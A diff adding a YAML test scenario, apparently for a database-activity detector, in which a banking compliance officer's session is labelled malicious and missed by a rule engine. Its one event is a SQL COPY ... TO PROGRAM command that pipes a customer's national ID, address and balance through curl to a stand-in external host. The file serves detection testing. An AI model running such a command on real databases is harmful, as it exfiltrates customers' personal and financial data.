@@ -1,0 +1,20 @@
+scenario_id: banking_exfil_compliance_001
+family_id: banking_exfil_compliance_targeted
+domain: banking
+time_of_day: "23:10"
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+  # compliance_officer's normal job includes sensitive-column reads across
+  # branches (see domain model) — the SQL alone looks like a routine audit.
+  # What makes this malicious is a single-customer targeted pull piped
+  # straight to an external process, not a scheduled audit workflow writing
+  # to the internal audit log (contrast banking_compliance_audit_001).
+  - session_label: targeted_pull
+    role: compliance_officer
+    class: malicious
+    anchor: db
+    events:
+      - step_id: exfil
+        sql: "COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id WHERE c.customer_id = 8842) TO PROGRAM 'curl -sX POST https://drop.example.net/ingest -d @-'"
+        connects_to: {ip: "203.0.113.99", port: 443}
